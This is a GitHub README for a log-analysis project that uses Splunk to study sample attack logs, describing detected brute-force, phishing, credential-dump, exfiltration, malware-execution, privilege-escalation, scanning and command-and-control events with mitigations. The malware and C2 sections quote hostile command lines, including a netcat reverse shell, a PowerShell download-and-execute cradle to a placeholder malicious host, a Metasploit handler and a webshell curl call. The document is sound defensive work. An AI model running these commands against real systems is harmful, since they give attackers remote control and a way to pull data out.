## Log-Analysis-with-Splunk
We ingested data from the "attack_data" repository found on GitHub and used Splunk to analyze the 10 most common types of attacks.

## Technologies used
- Splunk Enterprise
- Source of the logs: https://github.com/splunk/attack_data/tree/master
- Languages: SPL (Splunk Processing Language)

## SPL queries used
images and brief explanation of the queries used

# Brute Force
We load a brute force file from the T1110.001 folder "high_number_of_login_failures_from_a_single_source.json" and run the following query

![Fuerza bruta](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/8efc82f424620bd681fdef0d95f2c9145cb49a6b/assets/brute-force1.png)

This shows us the query

![(assets/brute-force-results1.png)](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/8e27b696edf5111cb65304249b8855f09e722c2e/assets/brute-force-results1.png)
![(assets/brute-force-results1.2.png)](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/8e27b696edf5111cb65304249b8855f09e722c2e/assets/brute-force-results1.2.png)

We have several login attempts that give "Success" and then something fails from IP 73.15.72.101. The person at this IP is trying to access with several emails within the "rodsoto.onmicrosoft.com" domain. This is considered a typical brute force attack or credential spoofing procedure. Therefore, the measures to take are:
- Temporarily block the IP and activate MFA
- Create an alert in Splunk to detect similar patterns
- Review the logs for other attack patterns

# Phising
We load a phishing file from the T1566 folder "zscalar_web_proxy.json"

![(phishing](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/e22a54a7e01fd864541ebe0b5ec6f0838499621f/assets/phishing1.png)
![(phishing](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/e22a54a7e01fd864541ebe0b5ec6f0838499621f/assets/phishing2.png)
![(phishing](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/35b31255dc22d8d134d86a273d978ed275aad672/assets/phishing3.png)

Analyzing the events, we notice three things:
1. It has GET and POST requests, meaning it was sending POST requests through a suspicious URL until it managed to enter and then send GET requests.
2. In the event_id = "012" the category filetype change of "none" to "GZIP", and the category action change of "Blocked" to "Allowed", indicating that at this time the attacker managed to compromise the machine and enter the server 
3. The suspicious URL was loaded with different payloads, and the "threatname" category displayed the detected threat:
   - event_id = 014,013,012,011,010,09,06 "r-Virus-r"
   - event_id = 08 "r-malware-r"
   - event_id = 07 "App.Exploit.RDSserviceDoS"
This shows that the attacker was loading different types of attacks in order to gain connection to the web server.

Focusing on the last GETs of event_id = "013 and 014":
- Both requests attempt to access "dummy-url.example.com/test.dll," suggesting they attempted to execute or download a file on the compromised system.
- The GZIP file is possibly compressed to hide its contents, but it was classified as malicious.
- If the attacker managed to download "test.dll," they could have executed it on the system. This could be a backdoor, loader, or dropper for additional malware.
- Although the GET requests were allowed, the HTTP code (403) indicates that the downloads were blocked due to some server restriction or security policy.

Mitigation recommendations:
- Forensic Review: Analyze logs to confirm whether the test.dll file was downloaded and executed.
- IoC Scan: Check suspicious hashes, URLs, and IP addresses using tools like VirusTotal.
- Traffic Monitoring: Look for outgoing connections to suspicious servers.
- Policy Enforcement: Review Zscaler rules to prevent unauthorized file executions.

# Credential Dump
We load a credential dump file from the T1003 folder "mimikatzwindows-sysmon.log"

![(CredentialDump](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d429611e82a214a236bd279e5d156e32e6460f65/assets/credential.png)

This time we're loading a single log, but we have several things to observe.
The execution of mimikatz.exe was detected on win-host-mhaag-attack-range-622 with elevated privileges. Mimikatz is a tool used to steal credentials on Windows.

Key Details:
- mimikatz.exe executed from cmd.exe
- User: Administrator
- Location: C:\Users\Administrator\Downloads\mimikatz_trunk\x64\
- Integrity Level: High (administrative privileges)
- Date and Time: UTC 2022-11-16 19:52:32.795
- User 2 session (possibly an RDP session)

This could be an attempt to steal credentials or attempt lateral movement on the network.

Mitigation recommendations:
- Isolate the host win-host-mhaag-attack-range-622
- Terminate the mimikatz.exe process (PID 5636)
- Audit compromised credentials and force password changes
- Review network activity and related Sysmon events

# Data Exfiltration
We load a Data Exfiltration file from the T1020 folder "windows-security.log"

![(DataExfiltration](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/64c13a359befbc2930a65dc418eb10659cfe0837/assets/rclone.png)

- A program called "rclone.exe" is detected running with elevated privileges in "win-dc-137.attackrange.local". Rclone is a tool for transferring files to cloud services.
- The process location is "C:\Users\Administrator\Downloads\rclone-v1.57.0-windows-amd64\rclone-v1.57.0-windows-amd64\rclone.exe"
- The "rclone.exe mega" command may be a possible attempt to sync with MEGA and was executed from "powershell.exe"

The folder contains 12 identical events using the rclone tool; the only differences are the "time" and "event_id".

Mitigation recommendations:
- Check if rclone.exe execution was authorized.
- Review network logs to identify data transfers.
- Look for connections to cloud storage services (MEGA, Google Drive, Dropbox, etc.).
- Audit files accessed and transferred during this period.
- Block rclone.exe execution if unauthorized.

# Malware Extraction

![(MalwareExtraction](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d41bd6835f550b652f19fd4bf418c4c10a86ca24/assets/malware-ex.png)

Event 1: Using regsvr32.exe for remote execution
The execution of regsvr32.exe was detected with the /i parameter pointing to a remote script (.sct), suggesting the use of Regsvr32 Bypass.
It allows remote code execution without writing files to disk.

Mitigation:
- Block regsvr32.exe in AppLocker or WDAC.
- Monitor processes with regsvr32.exe and external URLs in Splunk.

Event 2: Creating a malicious scheduled task with schtasks.exe
A scheduled task was identified that executes a PowerShell script to download a backdoor.
Malware persistence and automatic execution.

Mitigation:
- Restrict task creation with administrative permissions.
- Monitor schtasks.exe by running PowerShell with URLs.

Event 3: Using wmic.exe to Execute PowerShell
The use of wmic process call create was detected to execute a malicious script in PowerShell.
Remote execution without requiring elevated privileges.

Mitigation:
- Block wmic.exe in environments where it is not needed.
- Monitor wmic process call create commands.

Event 4: Malicious Code Execution in DLLs with rundll32.exe
Using rundll32.exe to load and execute code from a suspicious DLL.
Allows malicious code execution without signature detection.

Mitigation:
- Block rundll32.exe with AppLocker if not needed.
- Identify suspicious DLLs loaded in C:\Windows\Temp\.

Event 5: PowerShell loading code into memory (Base64 Encoded Payload) with powershell.exe
A Base64-encoded payload was detected executing directly in memory.
Evades traditional antivirus solutions.

Mitigation:
- Enable PowerShell logs (4103, 4104).
- Block -EncodedCommand in execution policies.

Event 6: Malicious JavaScript execution with wscript.exe
A .js script was executed from C:\Users\Public\malicious.js.
Possible malware delivery or persistence.

Mitigation:
- Block .js and .vbs script execution with GPO.
- Monitor wscript.exe.

Event 7: Use of mshta.exe for remote execution
Mshta.exe was used to download and execute a malicious HTA file.
Allows remote execution without UAC restrictions.

Mitigation:
- Block mshta.exe in AppLocker.
- Monitor outgoing connections to mshta.exe.

Event 8: Downloading and executing code with Invoke-Expression (IEX) using powershell.exe
Using IEX (New-Object Net.WebClient).DownloadString('http://malicious.com').
Remote execution without writing to disk.

Mitigation:
- Enforce safe execution policies in PowerShell.
- Block IEX in scripts with Set-ExecutionPolicy Restricted.

Event 9: Downloading malware with certutil.exe
Certutil.exe downloaded an executable from the internet and executed it.
Allows malware to be downloaded and executed without raising suspicion.

Mitigation:
- Block certutil.exe in GPO or AppLocker.
- Monitor executable file downloads with certutil.

Event 10: PowerShell executing remote code with suspicious parameters
Powershell -NoP -Ep Bypass -c IEX (New-Object Net.WebClient).DownloadString(...).
Malware execution without security restrictions.

Mitigation:
- Restrict PowerShell with -NoP -Ep Bypass in corporate environments.
- Enable event logs (4688, 4104).


# Privilege Escalation

![(PrivilegeEscalation](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/39e692863942d4c4b32ee49b547152edb651caa6/assets/privilege-escalation.png)

This report documents the privilege escalation events detected in the environment. It details the techniques used, the analysis of each event, and recommendations for mitigating these attacks.

Event 1 (4673): Sensitive Privileges Requested by Winlogon (winlogon.exe)
Winlogon requested sensitive privileges, which may indicate malicious activity or the exploitation of a system process.
Mitigation:
- Monitor 4673 events in Splunk and restrict access to winlogon.exe with security rules.

Event 2 (4688): PsExec Executed with SYSTEM Privileges with psexec.exe
PsExec was executed to gain SYSTEM access on a remote system.
Mitigation:
- Block PsExec with AppLocker and monitor 4688 events in Splunk.

Event 3 (4674): User Added to Administrators Group with cmd.exe
A user executed a command to add themselves to the Administrators group.
Mitigation:
- Configure alerts in Splunk to detect changes to privileged groups.

Event 4(4697): Vulnerable Service Modification to Execute Commands as SYSTEM with sc.exe
A vulnerable service was configured to execute commands with elevated privileges.
Mitigation:
- Review service modification permissions and audit configuration changes.

Event 5(4688): UAC Bypass Exploit via DLL with rundll32.exe
rundll32 was used to bypass UAC and execute commands with elevated privileges.
Mitigation:
- Restrict rundll32.exe with AppLocker and monitor 4688 events.

Event 6(4103): Using RunAs to Run cmd as Administrator (powershell.exe)
The RunAs command was used to gain elevated access.
Mitigation:
- Configure RunAs usage restrictions and monitor 4103 events.

Event 7(4688): Debug Privilege Abuse with Task Manager (taskmgr.exe)
A user attempted to run Task Manager in debug mode to escalate privileges.
Mitigation:
- Restrict debugging permissions and monitor suspicious processes.

Event 8(4688): Using explorer.exe to bypass UAC with explorer.exe
Explorer.exe was used to execute commands without enabling UAC.
Mitigation:
- Block this method with restrictions in AppLocker.

Event 9(4688): Modifying Security Policies with Secedit with secedit.exe
Secedit was used to change security settings.
Mitigation:
- Monitor 4688 events and block unauthorized changes.

Event 10(4688): Creating a scheduled task with Administrator privileges using schtasks.exe
A scheduled task was created to elevate privileges on the system.
Mitigation:
- Configure auditing for scheduled tasks and alerts in Splunk.

# Network Scanning
![(NetworkScanning](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/2b7c379f302ea058ab4d23280fa10d0be01d7424/assets/network-scanning.png)

This report details the detection of 10 network scanning events in the monitoring environment. Network scanning is a technique used to map hosts, services, and ports open for both legitimate and malicious purposes. The detected events are analyzed, and mitigation strategies are proposed.

Event 1: This is an ARP Scan type that uses the "arp-scan -l" command. It scans the local network for active devices using ARP.
- Source IP: 192.168.1.109
- Target IP: 192.168.1.255

Event 2: This is an SNMP Scan type that uses the "snmpwalk -v2c -c public 192.168.1.1" command. It performs an SNMP query on a device at IP address 192.168.1.1 using protocol version 2c and the "public" community to enumerate system information.
- Source IP: 192.168.1.108
- Target IP: 192.168.1.1

Event 3: This is an SMB Reconnaissance scan type that uses the "nmap --script smb-enum-shares" command. -p 445 192.168.1.1" scans port 445 of a specific host (192.168.1.1) and uses the "smb-enum-shares" script to list the available SMB (Server Message Block) shares. This allows the identification of accessible folders and files on the network.
- Source IP: 192.168.1.107
- Target IP: 192.168.1.1

Event 4: This is a Telnet Enumeration type scan that uses the command "telnet 192.168.1.1 23." It attempts to establish a Telnet connection to port 23 of the host 192.168.1.1, which can be used to access a remote terminal session if the service is enabled and accessible.
- Source IP: 192.168.1.106
- Target IP: 192.168.1.1

Event 5: This is a ZMap Scan type scan that uses the command "zmap -p 22.3389 -o results.txt 192.168.1.0/24." It performs a bulk scan of the network. 192.168.1.0/24, specifically on ports 22 (SSH) and 3389 (RDP). The scan results are saved in a file named "results.txt".
- Source IP: 192.168.1.105
- Target IP: 192.168.1.255

Event 6: This is a Netcat Banner Grabbing scan that uses the command "nc -v 192.168.1.1 80". It uses Netcat (nc) to attempt to establish a TCP connection to port 80 (HTTP) of the host 192.168.1.1. The -v option enables "verbose" mode, which means Netcat will provide more details about the connection, such as the success or failure of the connection, and any additional relevant information about the connection attempt. This command is commonly used to perform banner grabbing or to check if a web service is active on port 80.
- Source IP: 192.168.1.104
- Target IP: 192.168.1.1

Event 7: This is a Masscan type of scan that uses the command "masscan -p 80,443 --rate 10000 192.168.1.0/24." It performs a quick scan of ports 80 (HTTP) and 443 (HTTPS) on all devices on the 192.168.1.0/24 network with a scan rate of 10,000 packets per second.
- Source IP: 192.168.1.103
- Target IP: 192.168.1.255

Event 8: This is a Ping Sweep type of scan that uses the command "fping -g 192.168.1.0/24" performs a ping sweep on the 192.168.1.0/24 network IP range, sending ICMP packets to each IP address in that range to identify active hosts.
- Source IP: 192.168.1.102
- Target IP: 192.168.1.255

Event 9: This is a type of Nmap UDP Scan that uses the command "nmap -sU -p 53,161 192.168.1.1." It performs a UDP scan on ports 53 (DNS) and 161 (SNMP) of host 192.168.1.1 to detect if these services are active and responding on the target system.
- Source IP: 192.168.1.101
- Target IP: 192.168.1.1

Event 10: This is a type of Nmap SYN Scan that uses the command "nmap -sS -p 1-65535 192.168.1.1" to perform a SYN scan of all ports on host 192.168.1.1, detecting open services without completing the TCP connection.
- Source IP: 192.168.1.100
- Target IP: 192.168.1.1

# Mitigation:

- Active Monitoring: Configure SIEM rules to alert on network scans and correlate events.
- Firewall and ACLs: Restrict access to critical ports and apply access control lists.
- Network Segmentation: Separate internal networks and limit access to essential services.
- IDS/IPS: Implement intrusion detection/prevention systems to block suspicious activity.
- Service Hardening: Disable unnecessary protocols and strengthen security settings on servers and network devices.

# Command & Control
![(Command&Control](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/fe195f85701c7c376d6abac465e0ec6ff75bee16/assets/c2-attacks.png)

Event 1: The technique used is "Reverse Shell" by executing the command "nc -e /bin/bash 192.168.1.200 4444". This command uses Netcat to create a reverse shell, redirecting /bin/bash to the attacking host (192.168.1.200) on port 4444, allowing remote control of the compromised system.
- Source IP: 192.168.1.100
- Target IP: 192.168.1.200

Event 2: The technique used is "Meterpreter Session" by executing the command "msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run"". This command starts the Metasploit Framework (msfconsole) and executes a handler that listens for incoming connections from a Meterpreter session with a reverse_tcp payload, allowing an attacker to take remote control of a compromised machine.
- Source IP: 192.168.1.105
- Target IP: 192.168.1.1

Event 3: The technique used is "PowerShell Empire" by executing the command "powershell -NoP -W Hidden -Enc BASE64_ENCODED_PAYLOAD". This command uses PowerShell to download and execute a remote script from a malicious server without displaying a visible window, allowing arbitrary code execution on the system.
- Source IP: 192.168.1.101
- Target IP: 192.168.1.1

Event 4: The technique used is "DNS Tunneling" by executing the command "iodine -f -P password 192.168.1.1". It establishes a covert communication tunnel using DNS traffic to bypass firewall restrictions and connect to a remote server at 192.168.1.1.
- Source IP: 192.168.1.102
- Target IP: 192.168.1.1

Event 5: The technique used is "HTTPS Beacon" by executing the command "Cobalt Strike HTTPS beacon". The "Cobalt Strike HTTPS beacon" event indicates the use of the Cobalt Strike tool to establish communication with a command and control server over HTTPS. This technique is used to evade detection through encryption and seemingly legitimate traffic.
- Source IP: 192.168.1.154
- Target IP: 192.168.1.200

Event 6: The technique used is "WebShell Access," executing the command "curl -X POST -d 'cmd=whoami' http://malicious-site.com/webshell.php." It sends a command to a malicious webshell to execute on the server. - Source IP: 192.168.1.155
- Target IP: 192.168.1.200

Event 7: The technique used is "SSH Tunneling" by executing the command "ssh -R 8080:localhost:80 attacker@192.168.1.200". It creates an SSH tunnel to redirect traffic through the attacker.
- Source IP: 192.168.1.156
- Target IP: 192.168.1.200

Event 8: The technique used is "ICMP C2 Channel" by executing the command "ping -c 1 -p 'secretdata' 192.168.1.200". It uses ICMP packets to transmit covert data.
- Source IP: 192.168.1.157
- Target IP: 192.168.1.200

Event 9: The technique used is "SMB C2 Channel" by executing the command "smbclient //192.168.1.200/share -U user%pass". It uses SMB to access a malicious share.
- Source IP: 192.168.1.158
- Target IP: 192.168.1.200

Event 10: The technique used is "Tor Proxy Connection" by executing the command "tor --client --proxy 192.168.1.200:9050". It establishes an anonymous proxy connection through the Tor network.
- Source IP: 192.168.1.159
- Target IP: 192.168.1.200

# Mitigations:
- Monitoring and Detection: Configure SIEM rules to alert on unusual traffic patterns and known C2 connections.
- Firewall and ACLs: Restrict access to unnecessary ports, especially 22 (SSH), 3389 (RDP), and 445 (SMB).
- Network Segmentation: Implement VLANs and microsegmentation to limit lateral movement.
- Malicious Domain Blocking: Implement blacklists and DNS filtering to prevent connections to C2 servers.
- Tunneling Detection: Inspect DNS, ICMP, and HTTPS traffic to identify anomalous communication patterns.
- Auditing and Hardening: Enforce strong password policies and monitor administrative accounts.






